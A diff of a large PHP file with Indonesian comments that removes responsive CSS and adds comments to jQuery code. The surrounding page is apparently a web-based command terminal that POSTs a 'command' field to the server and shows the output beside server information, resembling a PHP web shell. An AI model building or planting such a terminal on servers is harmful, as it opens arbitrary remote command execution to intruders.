@@ -3897,7 +3897,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         </div>
     </div>
 
-  <!-- Server Info Section -->
+    <!-- Server Info Section -->
 <div class="server-info mt-5" style="display: inline-block; vertical-align: top; width: 48%; padding-right: 10px;">
     <h3>Server Information</h3>
     <ul>
@@ -3922,30 +3922,12 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         <strong><pre id="terminalOutput"><?php echo htmlspecialchars($output); ?></pre></strong>
     </div>
 </div>
-<style>
-    /* Media Query untuk perangkat mobile dan layar kecil */
-    @media (max-width: 768px) {
-        .server-info, .terminal-input {
-            display: block; /* Membuat elemen menjadi blok di perangkat kecil */
-            width: 100%; /* Menyesuaikan lebar ke 100% */
-            margin-bottom: 20px; /* Memberikan jarak antara elemen */
-        }
-    }
 
-    /* Tampilan untuk desktop */
-    @media (min-width: 769px) {
-        .server-info, .terminal-input {
-            display: inline-block; /* Menampilkan elemen secara sejajar */
-            width: 48%; /* Membatasi lebar masing-masing elemen menjadi 48% */
-            vertical-align: top; /* Menjaga elemen tetap sejajar pada bagian atas */
-        }
-    }
-</style>
 <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 <script>
     $(document).ready(function() {
         $('#terminalForm').on('submit', function(e) {
-            e.preventDefault(); 
+            e.preventDefault(); // Mencegah form dari reload halaman
             
             var input = $('#terminalInput').val().trim();
 
@@ -3960,7 +3942,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
                 type: 'POST',
                 data: { command: input },
                 success: function(response) {
-                    
+                    // Menampilkan hasil output dari server
                     var outputStart = response.indexOf("<pre id=\"terminalOutput\">") + 25; 
                     var outputEnd = response.indexOf("</pre>");
                     var output = response.substring(outputStart, outputEnd);
